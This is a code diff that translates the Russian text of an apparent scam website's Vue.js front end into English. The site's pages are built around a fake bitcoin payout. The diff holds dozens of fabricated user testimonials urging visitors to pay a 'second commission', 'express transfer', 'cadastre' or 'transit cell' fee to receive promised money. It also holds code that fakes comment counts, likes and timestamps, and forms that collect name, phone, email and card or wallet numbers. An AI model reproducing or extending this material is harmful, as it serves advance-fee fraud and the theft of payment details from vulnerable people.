                     page: ["error3405", "lawyercomission", "comissionsp"],
-                    name: "Алёна",
-                    text: "Арина, я тоже сперва возмутилась. Прождала пару часов, но так и не пришли.. Потом внимателей прочитала банковские условия, тут биткоин бонус не причем, это биллинги такие. Ждут оплату второй комиссии. Я оплатила вторую комиссию и денежки моментально пришли)",
+                    name: "Alena",
+                    text: "Arina, I was also outraged at first. I waited a couple of hours, but they did not come.. Then I carefully read the bank terms, Bitcoin Bonus is not to blame, it's the billing systems. They are waiting for payment of the second commission. I paid the second commission and the money arrived instantly)",
                     type: "user",
                     likes: 5,
                     timeh: 1,
@@ -2122,8 +2122,8 @@
                     stars: 4
                 }, {
                     page: ["error3405", "lawyercomission", "comissionsp"],
-                    name: "Костя",
-                    text: "Арина, читайте внимательней, это комиссия за второй перевод. Для тех, у кого суммы свыше {{geoMoneyHalfLimit}}. Я оплатил и получил. Не тратьте все деньги в одном месте как сказал один великий)",
+                    name: "Kostya",
+                    text: "Arina, read carefully, this is the commission for the second transfer. For those with amounts over {{geoMoneyHalfLimit}}. I paid and received. Do not spend all your money in one place, as one great man said)",
                     type: "user",
                     likes: 2,
                     timeh: 1,
@@ -2133,8 +2133,8 @@
                     stars: 4
                 }, {
                     page: ["error3405", "lawyercomission", "comissionsp"],
-                    name: "Никита Фёдорович",
-                    text: "Хочу Вас поблагодарить, обещанная сумма пришла ко мне на карточку, я очень и очень рад!",
+                    name: "Nikita Fyodorovich",
+                    text: "I want to thank you, the promised amount arrived on my card, I am very, very happy!",
                     type: "user",
                     likes: 29,
                     timeh: 4,
@@ -2144,8 +2144,8 @@
                     stars: 5
                 }, {
                     page: ["error3405", "lawyercomission", "comissionsp"],
-                    name: "Анна",
-                    text: "Получила. {{geoMoneyLimitWithdraw1}} подтверждаю! А в ГостЛото ребят, лучше не играйте, нервы вам съедят! Но этот сайт поможет всем.",
+                    name: "Anna",
+                    text: "Received. {{geoMoneyLimitWithdraw1}} I confirm! And guys, better not play in GosLoto, it will eat your nerves! But this site will help everyone.",
                     type: "user",
                     likes: 18,
                     timeh: 4,
@@ -2155,8 +2155,8 @@
                     stars: 5
                 }, {
                     page: ["error3405", "lawyercomission", "comissionsp"],
-                    name: "Кира",
-                    text: "Так они не виноваты, что у платежной системы коммисия.",
+                    name: "Kira",
+                    text: "They are not to blame that the payment system has a commission.",
                     type: "user",
                     likes: 0,
                     timeh: 5,
@@ -2166,8 +2166,8 @@
                     stars: 5
                 }, {
                     page: ["error3405", "lawyercomission", "comissionsp"],
-                    name: "Лев",
-                    text: "А я получил) И я в ШОКЕ от такого большого спроса на биткоин сегодня! Вывел {{geoMoneyLimitWithdraw2}}",
+                    name: "Lev",
+                    text: "And I received it) And I am SHOCKED by such a high demand for bitcoin today! Withdrew {{geoMoneyLimitWithdraw2}}",
                     type: "user",
                     likes: 47,
                     timeh: 6,
@@ -2177,8 +2177,8 @@
                     stars: 5
                 }, {
                     page: ["error3405", "lawyercomission", "comissionsp"],
-                    name: "Герман",
-                    text: "Кто мне гарантирует что после оплаты комиссии я получу свои деньги? Ну лан попробуем, не убудет!",
+                    name: "German",
+                    text: "Who guarantees me that after paying the commission I will receive my money? Well, let's try, it won't hurt!",
                     type: "user",
                     likes: 0,
                     timeh: 8,
@@ -2188,8 +2188,8 @@
                     stars: 3
                 }, {
                     page: ["error3405", "lawyercomission", "comissionsp"],
-                    name: "Полина",
-                    text: "Заработала на Bitcoin World, оплатила всё что они просили. Но ждать пришлось больше 3х месяцев, пока сама не обратилась в {sitename}. Что я могу сказать, {{geoMoneyLimitWithdraw3}} у меня уже на карте :)",
+                    name: "Polina",
+                    text: "I earned on Bitcoin World, paid everything they asked. But I had to wait more than 3 months until I contacted {sitename} myself. What can I say, {{geoMoneyLimitWithdraw3}} is already on my card :)",
                     type: "user",
                     likes: 17,
                     timeh: 9,
@@ -2199,8 +2199,8 @@
                     stars: 4
                 }, {
                     page: ["error3405", "lawyercomission", "comissionsp"],
-                    name: "Кира",
-                    text: "Оплатила комиссию, все пришло. Только сначала долго ждала первый перевод. Не дождалась... А вот после оплаты комиссии за второй перевод пришла вся сумма моментально! Способ: криптовалюта рекомендую.",
+                    name: "Kira",
+                    text: "I paid the commission, everything arrived. Only at first I waited a long time for the first transfer. I did not wait... But after paying the commission for the second transfer, the entire amount arrived instantly! Method: cryptocurrency, I recommend.",
                     type: "user",
                     likes: 89,
                     timeh: 12,
@@ -2210,8 +2210,8 @@
                     stars: 4
                 }, {
                     page: ["express"],
-                    name: "Дарья",
-                    text: "Ух ты здоровски придумали!! Хоть не надо платить НДФЛ. Оплатила экспресс перевод и чувствую себя спокойно. Денежки пришли на карту как платеж физическому лицу. Я свои 78 000 получила и очень очень рада!! ВОТ и мой скрин",
+                    name: "Darya",
+                    text: "Wow, that's a great idea!! At least you don't have to pay personal income tax. I paid for the express transfer and feel calm. The money arrived on my card as a payment to an individual. I got my 78,000 and I am very, very happy!! HERE is my screenshot",
                     type: "user",
                     likes: 118,
                     timeh: 2,
@@ -2221,8 +2221,8 @@
                     stars: 5
                 }, {
                     page: ["express"],
-                    name: "Роман",
-                    text: "Хитро сделали с экпресс переводом. Зато денежки наши сохраняться. Я как понял получается я деньги получил как физ.перевод, а не как прибыль. Поэтому налог и не взимается. Честь и хвала за ум. 87 т.руб. получено.",
+                    name: "Roman",
+                    text: "Clever move with the express transfer. At least our money will be saved. As I understand it, I received the money as a physical transfer, not as profit. Therefore, tax is not charged. Honor and praise for the wit. 87 thousand rubles received.",
                     type: "user",
                     likes: 321,
                     timeh: 3,
@@ -2232,8 +2232,8 @@
                     stars: 4
                 }, {
                     page: ["express"],
-                    name: "Таисия",
-                    text: "Действительно платят! Я до последнего не верила..... {sitename} лучшие! Пойду ещё билетов в лото накуплю))",
+                    name: "Taisiya",
+                    text: "They really do pay! I didn't believe it until the last moment..... {sitename} are the best! I'll go buy more lottery tickets))",
                     type: "user",
                     likes: 221,
                     timeh: 4,
@@ -2243,8 +2243,8 @@
                     stars: 5
                 }, {
                     page: ["express"],
-                    name: "Ксюша",
-                    text: "Класс! Я сегодня самая счастливая, пойдем сегодня с мужем в самый дорогой ресторан!!! Это чудо, всем спасибо!!!))))))",
+                    name: "Ksyusha",
+                    text: "Great! I am the happiest today, let's go to the most expensive restaurant with my husband!!! This is a miracle, thank you everyone!!!))))))",
                     type: "user",
                     likes: 12,
                     timeh: 7,
@@ -2254,8 +2254,8 @@
                     stars: 5
                 }, {
                     page: ["express"],
-                    name: "Мирон",
-                    text: "Спасибо! Получил свои кровные 85 300 тысяч. {sitename} лучше всех!!!",
+                    name: "Miron",
+                    text: "Thank you! Received my hard-earned 85,300 thousand. {sitename} is the best!!!",
                     type: "user",
                     likes: 329,
                     timeh: 9,
@@ -2265,8 +2265,8 @@
                     stars: 5
                 }, {
                     page: ["express"],
-                    name: "Алексей Александрович",
-                    text: "Ребят, все сегодня вывести смогли?",
+                    name: "Alexey Alexandrovich",
+                    text: "Guys, was everyone able to withdraw today?",
                     type: "user",
                     likes: 0,
                     timeh: 11,
@@ -2276,8 +2276,8 @@
                     stars: 2
                 }, {
                     page: ["express"],
-                    name: "Ирина",
-                    text: "Точно не обман, подверждаю, 112780 руб. пришли ко мне на карту сбербанк!",
+                    name: "Irina",
+                    text: "Definitely not a scam, I confirm, 112,780 rubles arrived on my Sberbank card!",
                     type: "user",
                     likes: 1360,
                     timeh: 12,
@@ -2287,8 +2287,8 @@
                     stars: 4
                 }, {
                     page: ["express"],
-                    name: "Зинаида",
-                    text: "Мда.. Я думаю.. нужен ли мне этот экпресс счет?",
+                    name: "Zinaida",
+                    text: "Hmm.. I'm thinking.. do I need this express account?",
                     type: "user",
                     likes: 0,
                     timeh: 14,
@@ -2298,8 +2298,8 @@
                     stars: 3
                 }, {
                     page: ["express"],
-                    name: "Анюта",
-                    text: "Я восторге!!! Не знаю как выразить вам свою благодарность, это что-то с чем-то, у меня слов больше нет!) Спасибочки вам большое!!!))))))))))))))))))",
+                    name: "Anyuta",
+                    text: "I am delighted!!! I don't know how to express my gratitude, it's something else, I have no words anymore!) Thank you very much!!!))))))))))))))))))",
                     type: "user",
                     likes: 339,
                     timeh: 16,
@@ -2309,8 +2309,8 @@
                     stars: 5
                 }, {
                     page: ["express"],
-                    name: "Тимур",
-                    text: "Я жил практически на улице, и как обрадовался вашему уведмолению! Оплатил экспресссчет, получил деньги, и даже не оплатил НДФЛ",
+                    name: "Timur",
+                    text: "I lived practically on the street, and how happy I was with your notification! I paid for the express account, received the money, and didn't even pay personal income tax.",
                     type: "user",
                     likes: 429,
                     timeh: 22,
@@ -2320,8 +2320,8 @@
                     stars: 5
                 }, {
                     page: ["cadastr"],
-                    name: "Семён",
-                    text: "Шо це правда)) Залетело 130 000 гривен на карту. Мне как заядлому рыбаку полагается потратить на спиннинг и снасти. Рыбалочка уже близко)",
+                    name: "Semyon",
+                    text: "Is this true)) 130,000 hryvnias flew onto my card. As an avid fisherman, I need to spend it on a spinning rod and tackle. Fishing is coming soon)",
                     type: "user",
                     likes: 537,
                     timeh: 3,
@@ -2331,8 +2331,8 @@
                     stars: 5
                 }, {
                     page: ["cadastr"],
-                    name: "Жанна",
-                    text: "Мне пришли денюжки)",
+                    name: "Zhanna",
+                    text: "I received the money)",
                     type: "user",
                     likes: 1578,
                     timeh: 5,
@@ -2342,8 +2342,8 @@
                     stars: 5
                 }, {
                     page: ["cadastr"],
-                    name: "Руслан",
-                    text: "Кому пришла выплата?",
+                    name: "Ruslan",
+                    text: "Who received the payout?",
                     type: "user",
                     likes: 0,
                     timeh: 7,
@@ -2353,8 +2353,8 @@
                     stars: 3
                 }, {
                     page: ["cadastr"],
-                    name: "Виталий",
-                    text: "Еехуу деньги пришли!!! Смело заносите выплату в кадастр, иначе не будет выплаты!",
+                    name: "Vitaly",
+                    text: "Yahoo, the money arrived!!! Feel free to enter the payout into the cadastre, otherwise there will be no payout!",
                     type: "user",
                     likes: 498,
                     timeh: 9,
@@ -2364,8 +2364,8 @@
                     stars: 5
                 }, {
                     page: ["cadastr"],
-                    name: "Михаил",
-                    text: "Hello. Спасибо за выплату! Пришла!",
+                    name: "Mikhail",
+                    text: "Hello. Thank you for the payout! It arrived!",
                     type: "user",
                     likes: 765,
                     timeh: 12,
@@ -2375,8 +2375,8 @@
                     stars: 4
                 }, {
                     page: ["cadastr"],
-                    name: "Алина",
-                    text: "Как же я рада что после внесения в кадастр моего личного вознаграждения за вопросы на сумму 175 763 рублей я их все получила на карточку сберегательного банка. Похвала такому честному проекту!",
+                    name: "Alina",
+                    text: "How happy I am that after entering my personal reward for questions in the amount of 175,763 rubles into the cadastre, I received it all on my savings bank card. Praise to such an honest project!",
                     type: "user",
                     likes: 431,
                     timeh: 15,
@@ -2386,8 +2386,8 @@
                     stars: 5
                 }, {
                     page: ["cadastr"],
-                    name: "Артемий",
-                    text: "Теперь я вас благодарю, не ожидал, что придут деньги!",
+                    name: "Artemy",
+                    text: "Now I thank you, I did not expect the money to arrive!",
                     type: "user",
                     likes: 852,
                     timeh: 18,
@@ -2397,8 +2397,8 @@
                     stars: 5
                 }, {
                     page: ["cadastr"],
-                    name: "Нина Ивановна",
-                    text: "Спасибо за помощь пенсионерке!!!!!!!!",
+                    name: "Nina Ivanovna",
+                    text: "Thank you for helping a pensioner!!!!!!!!",
                     type: "user",
                     likes: 462,
                     timeh: 20,
@@ -2408,8 +2408,8 @@
                     stars: 5
                 }, {
                     page: ["cadastr"],
-                    name: "Юля",
-                    text: "Блин...Не верю... действительно пришли денюжки, я в шоке...",
+                    name: "Yulia",
+                    text: "Damn...I don't believe it... the money really arrived, I'm in shock...",
                     type: "user",
                     likes: 347,
                     timeh: 21,
@@ -2419,8 +2419,8 @@
                     stars: 4
                 }, {
                     page: ["transitbooking"],
-                    name: "Зоя",
-                    text: "Оплатила бронь транзитной ячейки, перевод поступил! Я от всего сердца ВАС благодарю!",
+                    name: "Zoya",
+                    text: "I paid for the booking of the transit cell, the transfer arrived! I thank you from the bottom of my heart!",
                     type: "user",
                     likes: 492,
                     timeh: 2,
@@ -2430,8 +2430,8 @@
                     stars: 4
                 }, {
                     page: ["transitbooking"],
-                    name: "Валерия",
-                    text: "Думала деньги не придут, но всё хорошо, 102350 рублей поступили после брони. Огромное Вам спасибо!",
+                    name: "Valeria",
+                    text: "I thought the money would not come, but everything is fine, 102,350 rubles arrived after booking. Thank you very much!",
                     type: "user",
                     likes: 1762,
                     timeh: 5,
@@ -2441,8 +2441,8 @@
                     stars: 5
                 }, {
                     page: ["transitbooking"],
-                    name: "Александра",
-                    text: "Подтверждаю, я получила общанные деньги 144550 рублей после бронирования",
+                    name: "Alexandra",
+                    text: "I confirm, I received the promised money 144,550 rubles after booking",
                     type: "user",
                     likes: 821,
                     timeh: 8,
@@ -2452,8 +2452,8 @@
                     stars: 4
                 }, {
                     page: ["transitbooking"],
-                    name: "Марфа",
-                    text: "Кто получил деньги после бронирования",
+                    name: "Martha",
+                    text: "Who received the money after booking?",
                     type: "user",
                     likes: 0,
                     timeh: 14,
@@ -2463,8 +2463,8 @@
                     stars: 3
                 }, {
                     page: ["transitbooking"],
-                    name: "Азамат",
-                    text: "Фуух, вот что что а транзитная ячейка весьма удобная штука, деньги от {sitename} пришли быстро.",
+                    name: "Azamat",
+                    text: "Phew, the transit cell is a very convenient thing, the money from {sitename} arrived quickly.",
                     type: "user",
                     likes: 35,
                     timeh: 18,
@@ -2474,8 +2474,8 @@
                     stars: 5
                 }, {
                     page: ["transitbooking"],
-                    name: "Влад",
-                    text: "98 167 р. получены на карту. Пришли спустя 5 минут после бронирования.",
+                    name: "Vlad",
+                    text: "98,167 rubles received on the card. Arrived 5 minutes after booking.",
                     type: "user",
                     likes: 2857,
                     timeh: 26,
@@ -2485,8 +2485,8 @@
                     stars: 4
                 }, {
                     page: ["transitbooking"],
-                    name: "Николай",
-                    text: "После бронирования транзитной ячейки получил свою выплату. Спасибо!",
+                    name: "Nikolay",
+                    text: "After booking the transit cell, I received my payout. Thank you!",
                     type: "user",
                     likes: 3874,
                     timeh: 32,
@@ -2496,8 +2496,8 @@
                     stars: 5
                 }, {
                     page: ["transitbooking"],
-                    name: "Серафима",
-                    text: "Это чудо!!! Я богатая теперь 200 000 рублей, обалдеть!!!!",
+                    name: "Serafima",
+                    text: "This is a miracle!!! I'm rich now, 200,000 rubles, unbelievable!!!!",
                     type: "user",
                     likes: 5721,
                     timeh: 38,
@@ -2508,7 +2508,7 @@
                 }, {
                     page: ["transitbooking"],
                     name: "Anna",
-                    text: "Не знаю.. Попробую... Я просто последние деньги отдаю. (добавлено) Ураа! Пришли, зря сомневалась. Ребят забирайте свое скорее!",
+                    text: "I don't know.. I'll try... I'm giving my last money. (added) Hurray! It arrived, I doubted in vain. Guys, take yours quickly!",
                     type: "user",
                     likes: 7820,
                     timeh: 47,
@@ -2534,8 +2534,8 @@
                             commentsDate: [],
                             comments: [],
                             nowDate: new Date,
-                            months: ["января", "февраля", "марта", "апреля", "мая", "июня", "июля", "августа", "сентября", "октября", "ноября", "декабря"],
-                            month: new Array("янв", "фев", "мар", "апр", "мая", "июн", "июл", "авг", "сен", "окт", "нояб", "дек"),
+                            months: ["January", "February", "March", "April", "May", "June", "July", "August", "September", "October", "November", "December"],
+                            month: new Array("Jan", "Feb", "Mar", "Apr", "May", "Jun", "Jul", "Aug", "Sep", "Oct", "Nov", "Dec"),
                             userStars: 1,
                             showComments: !0,
                             sitename: this.$store.state["/offbitbonus/"].sitename
@@ -2546,7 +2546,7 @@
                             return this.nowDate.getDate() + " " + this.month[this.nowDate.getMonth()] + " " + this.nowDate.getFullYear()
                         },
                         totalComments: function() {
-                            return "29325 комментариев"
+                            return "29325 comments"
                         },
                         userAvatar: function() {
                             return this.$store.getters.account.avatar
@@ -2569,20 +2569,20 @@
                                 case 2:
                                     if (i.toString().length > 3 && i.toString().length < 6) {
                                         var o = n + i.slice(0, -3);
-                                        return (this.$numberWithSpaces(parseInt(o)) + "тыщ.").replace(/&nbsp;/gm, " ")
+                                        return (this.$numberWithSpaces(parseInt(o)) + "k").replace(/&nbsp;/gm, " ")
                                     }
                                     if (i.toString().length > 6) {
                                         var l = n + i.slice(0, -6);
-                                        return (this.$numberWithSpaces(parseInt(l)) + "млн.").replace(/&nbsp;/gm, " ")
+                                        return (this.$numberWithSpaces(parseInt(l)) + "M").replace(/&nbsp;/gm, " ")
                                     }
                                     case 3:
                                         if (i.toString().length > 3 && i.toString().length < 6) {
                                             var c = n + i.slice(0, -3);
-                                            return (this.$numberWithSpaces(parseInt(c)) + " тыc.&nbsp;" + this.$store.getters.geoCurrency).replace(/&nbsp;/gm, " ")
+                                            return (this.$numberWithSpaces(parseInt(c)) + "k&nbsp;" + this.$store.getters.geoCurrency).replace(/&nbsp;/gm, " ")
                                         }
                                         if (i.toString().length > 6) {
                                             var u = n + i.slice(0, -6);
-                                            return (this.$numberWithSpaces(parseInt(u)) + " млн.&nbsp;" + this.$store.getters.geoCurrency).replace(/&nbsp;/gm, " ")
+                                            return (this.$numberWithSpaces(parseInt(u)) + "M&nbsp;" + this.$store.getters.geoCurrency).replace(/&nbsp;/gm, " ")
                                         }
                                         break;
                                     default:
@@ -2590,7 +2590,7 @@
                             }
                         },
                         commentLikes: function(e, t) {
-                            return e ? 0 === t ? this.$store.getters.account.login : "Вы и ещё " + t : t
+                            return e ? 0 === t ? this.$store.getters.account.login : "You and " + t + " others" : t
                         },
                         reply: function(e) {
                             null === this.userComment.match(e) && (this.userComment = e + ", ", this.$reachGoal("comment_reply")), this.$refs["modal-newcomment"].show()
@@ -2609,7 +2609,7 @@
                         },
                         newCommentary: function() {
                             var e = this.userComment;
-                            if ("" === e.replace(/\n/gm, "")) return alert("Сообщение не может быть пустым"), !1;
+                            if ("" === e.replace(/\n/gm, "")) return alert("Message cannot be empty"), !1;
                             this.userComment.replace(/\n/gm, "<br>"), this.comments.unshift({
                                 page: this.$router.currentRoute.name,
                                 name: this.$store.getters.account.login,
@@ -2636,7 +2636,7 @@
                         toggleLike: function(e, t) {
                             switch (e.type) {
                                 case "author":
-                                    alert("Функция лайка своей записи временно недоступна");
+                                    alert("The like function for your own post is temporarily unavailable");
                                     break;
                                 case "user":
                                 case "support":
@@ -2650,24 +2650,24 @@
                             }
                         },
                         CommentsSequence: function(e, t) {
-                            if (0 === e) return "author" === t ? "Только что" : "1&nbsp;ч.";
-                            if (e <= 23) return e + "&nbsp;ч.";
-                            if (e > 23 && e < 48) return "Вчера";
+                            if (0 === e) return "author" === t ? "Just now" : "1&nbsp;h";
+                            if (e <= 23) return e + "&nbsp;h";
+                            if (e > 23 && e < 48) return "Yesterday";
                             var s = this.d.$backHours(e);
-                            return s.getDate() + " " + this.months[s.getMonth()] + " " + s.getFullYear() + " г."
+                            return s.getDate() + " " + this.months[s.getMonth()] + " " + s.getFullYear()
                         },
                         setAutoCommentsDate: function(e) {
                             Date.prototype.$backHours = function(e) {
                                 return this.setTime(this.getTime() - 60 * e * 60 * 1e3), this
                             };
                             for (var t = Number(), s = 0; s < 100; s++)
-                                if (0 === s) this.commentsDate.push("Только что");
+                                if (0 === s) this.commentsDate.push("Just now");
                                 else if (t += this.$randInt(1, 3), 0 === t) this.commentsDate.push(1);
-                            else if (t <= 23) this.commentsDate.push(t + "&nbsp;ч.");
-                            else if (t > 23 && t < 48) this.commentsDate.push("Вчера");
+                            else if (t <= 23) this.commentsDate.push(t + "&nbsp;h");
+                            else if (t > 23 && t < 48) this.commentsDate.push("Yesterday");
                             else {
                                 var i = this.d.$backHours(t);
-                                this.commentsDate.push(i.getDate() + " " + this.months[i.getMonth()] + " " + i.getFullYear() + " г.")
+                                this.commentsDate.push(i.getDate() + " " + this.months[i.getMonth()] + " " + i.getFullYear())
                             }
                         },
                         selfLikesInit: function() {
@@ -2716,7 +2716,7 @@
                             psAlias: window.psAlias,
                             publicPath: "/offbitbonus/",
                             isLoading: !1,
-                            loadingMessage: "загрузка",
+                            loadingMessage: "Loading",
                             statusMessage: "",
                             isError: !1,
                             lang: window.lang,
@@ -2725,8 +2725,8 @@
                             },
                             upsell: {},
                             d: new Date,
-                            month: new Array("янв", "фев", "мар", "апр", "мая", "июн", "июл", "авг", "сен", "окт", "нояб", "дек"),
-                            monthFull: new Array("января", "февраля", "марта", "апреля", "мая", "июня", "июля", "августа", "сентября", "октября", "ноября", "декабря"),
+                            month: new Array("Jan", "Feb", "Mar", "Apr", "May", "Jun", "Jul", "Aug", "Sep", "Oct", "Nov", "Dec"),
+                            monthFull: new Array("January", "February", "March", "April", "May", "June", "July", "August", "September", "October", "November", "December"),
                             sitename: this.$store.state["/offbitbonus/"].sitename,
                             sale: !1
                         }
@@ -2751,7 +2751,7 @@
                             return this.$numberWithSpaces(parseInt(n)) + "&nbsp;" + this.$store.getters.geoCurrency
                         },
                         todayFull: function() {
-                            return this.d.getDate() + " " + this.monthFull[this.d.getMonth()] + " " + this.d.getFullYear() + " г."
+                            return this.d.getDate() + " " + this.monthFull[this.d.getMonth()] + " " + this.d.getFullYear()
                         },
                         rescueBtc: function() {
                             if (this.$store.getters.user.rescueBtc - this.$store.getters.user.btc === .002723000000000003) return this.$store.getters.user.rescueBtc;
@@ -2783,7 +2783,7 @@
                             return (this.$store.getters.rescueMoney / e).toFixed(5) + "&nbsp;BTC"
                         },
                         convertedAmountRUB: function() {
-                            return 1 == this.$store.getters.kurs ? this.$store.getters.rescueMoney + " руб" : this.$numberWithSpaces(this.$geoUpsellPriceOnlyNum(this.$store.getters.rescueMoney, "rub")).replace(/ *\([^)]*\) */g, "")
+                            return 1 == this.$store.getters.kurs ? this.$store.getters.rescueMoney + " RUB" : this.$numberWithSpaces(this.$geoUpsellPriceOnlyNum(this.$store.getters.rescueMoney, "rub")).replace(/ *\([^)]*\) */g, "")
                         },
                         convertedAmountUSD: function() {
                             return 1 == this.$store.getters.dollar ? "$" + this.$store.getters.rescueMoney : this.$numberWithSpaces(this.$geoUpsellPriceOnlyNum(this.$store.getters.rescueMoney, "usd")).replace(/ *\([^)]*\) */g, "")
@@ -2792,10 +2792,10 @@
                             return this.$store.getters.geoCurrency
                         },
                         converting_geoCur_or_USD: function() {
-                            return "usd" !== this.$store.getters.geoCurrency.toLowerCase() ? this.$store.getters.geoCurrency : "USD (доллары США)"
+                            return "usd" !== this.$store.getters.geoCurrency.toLowerCase() ? this.$store.getters.geoCurrency : "USD (US dollars)"
                         },
                         converted_USD_or_EUR: function() {
-                            return "usd" == this.$store.getters.geoCurrency.toLowerCase() ? "EUR (евро)" : "USD (доллары США)"
+                            return "usd" == this.$store.getters.geoCurrency.toLowerCase() ? "EUR (euros)" : "USD (US dollars)"
                         },
                         getReceiptAmount: function() {
                             return this.upsells[this.lang].comissionfp.amount[this.psAlias]
@@ -2809,22 +2809,22 @@
                             return this.$numberWithSpaces(this.$geoUpsellPrice(this.upsell.amount[this.psAlias]))
                         },
                         usernamePlaceholder: function() {
-                            return this.$store.getters.username || "Введите Ваше ФИО"
+                            return this.$store.getters.username || "Enter your full name"
                         },
                         userphonePlaceholder: function() {
-                            return this.$store.getters.userphone || "Введите Ваш номер телефона"
+                            return this.$store.getters.userphone || "Enter your phone number"
                         },
                         paymentNumberPlaceholder: function() {
-                            return this.$store.getters.paymentNumber || "Введите номер карты или кошелька"
+                            return this.$store.getters.paymentNumber || "Enter card or wallet number"
                         },
                         useremailPlaceholder: function() {
-                            return this.$store.getters.useremail || "Введите адрес электронной почты"
+                            return this.$store.getters.useremail || "Enter your email address"
                         },
                         username: function() {
                             return localStorage.getItem(this.publicPath + "username") || ""
                         },
                         paymentMethod: function() {
-                            return this.$store.getters.paymentMethod || "Банковская карта (Россия)"
+                            return this.$store.getters.paymentMethod || "Bank card (Russia)"
                         },
                         paymentNumber: function() {
                             return localStorage.getItem(this.publicPath + "paymentNumber") || ""
@@ -2859,7 +2859,7 @@
                                     a = 0,
                                     n = setInterval((function() {
                                         if (console.log("here"), s.length > 10) return i('{"buy_domain":"' + s + '"}'), console.log(s), clearInterval(n), !1;
-                                        s = document.getElementById("domainGeneralSSS").getAttribute("href"), a++, a > 5e3 && (alert("Что-то не так. Сейчас страница перезагрузится и попробуйте еще раз нажать на кнопку оплаты. Нажмите ОК для продолжения."), window.location.reload(), clearInterval(n))
+                                        s = document.getElementById("domainGeneralSSS").getAttribute("href"), a++, a > 5e3 && (alert("Something went wrong. The page will now reload and try again. Click OK to continue."), window.location.reload(), clearInterval(n))
                                     }), 1)
                             }
 
@@ -2918,7 +2918,7 @@
                                     localStorage.setItem(this.publicPath + "firstpay", 1), this.$router.push("/account/" + this.upsells[this.lang].order[this.upsells[this.lang].order.indexOf(this.$route.params.product) + 1]);
                                     break;
                                 case "bd174c98a":
-                                    this.$reachGoal("unsuccess_pay"), alert("К сожалению, ваш платеж не прошел, проверьте правильность данных и повторите снова!"), this.statusMessage = "К сожалению, Ваш платеж не прошёл, попробуйте ещё раз или воспользуйтесь другим способом оплаты.", this.isError = !0;
+                                    this.$reachGoal("unsuccess_pay"), alert("Unfortunately, your payment failed, please check your details and try again!"), this.statusMessage = "Unfortunately, your payment did not go through, please try again or use another payment method.", this.isError = !0;
                                     break;
                                 default:
                             }
